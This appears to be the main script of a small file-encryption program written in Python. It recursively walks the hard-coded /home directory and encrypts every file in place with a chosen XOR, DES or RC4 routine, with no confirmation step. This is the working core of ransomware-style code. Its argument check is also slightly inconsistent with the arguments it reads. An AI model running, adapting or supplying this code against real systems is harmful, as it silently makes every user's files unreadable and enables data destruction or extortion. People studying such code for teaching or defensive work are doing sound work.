import sys
import os

import XOR
import DES
import RC4

def encrypt_files(file, ciphersystem, cipherkeyset):
    if ciphersystem == "XOR":
        XOR.xor_cipher(file, cipherkeyset, 'E')
    
    if ciphersystem == "DES":
        DES.des_cipher(file, cipherkeyset, 'E')  # ONLY WORKS FOR TEXT FILES / FILES THAT WORK WITH 'r' and encoding = 'utf-8'

    if ciphersystem == "RC4":
        RC4.rc4_cipher(file, cipherkeyset, 'E')            

def search_files(directory, ciphersystem, cipherkeyset):
    for filename in os.listdir(directory):  # Iterate over each file in the directory
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):  # Check if the filepath is a file (not a directory)
            encrypt_files(filepath, ciphersystem, cipherkeyset)
            print("encrypted: ", filename)
        else:
            search_files(filepath, ciphersystem, cipherkeyset)  # If it's a directory, recursively search it

def main(ciphersystem, cipherkeyset):
    directory = r"/home"
    search_files(directory, ciphersystem, cipherkeyset)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("""Incorrect Usage. Usage: python3 main.py [ciphersystem] [cipherkeyset]
                                        [ciphersystem] = XOR, DES, RC4
                                        [cipherkeyset] = keyset1 (for example)
                                        """)
        exit()
        
    ciphersystem = sys.argv[1]
    cipherkeyset = sys.argv[2]
    
    main(ciphersystem, cipherkeyset) 
